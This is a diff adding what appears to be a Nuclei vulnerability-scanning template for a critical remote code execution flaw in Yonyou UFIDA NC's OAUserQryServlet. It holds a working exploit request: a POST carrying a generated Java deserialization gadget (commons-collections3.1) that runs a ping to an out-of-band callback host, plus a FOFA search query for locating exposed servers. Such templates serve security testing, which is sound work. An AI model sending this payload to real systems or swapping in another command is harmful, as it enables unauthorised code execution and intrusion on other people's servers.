@@ -1,0 +1,30 @@
+id: yonyou-nc-OAUserQryServlet-rce
+
+info:
+  name: 用友 UFIDA NC OAUserQryServlet - rce
+  author: leadlife
+  severity: critical
+  description:
+  reference:
+    - todo
+  metadata:
+    veified: true
+    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
+  tags: yonyou,nc,rce,oa,oob
+
+http:
+  - raw:
+      - |
+        POST /servlet/OAUserQryServlet?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-java-serialized-object
+
+        {{generate_java_gadget("commons-collections3.1", "ping {{interactsh-url}}", "raw")}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
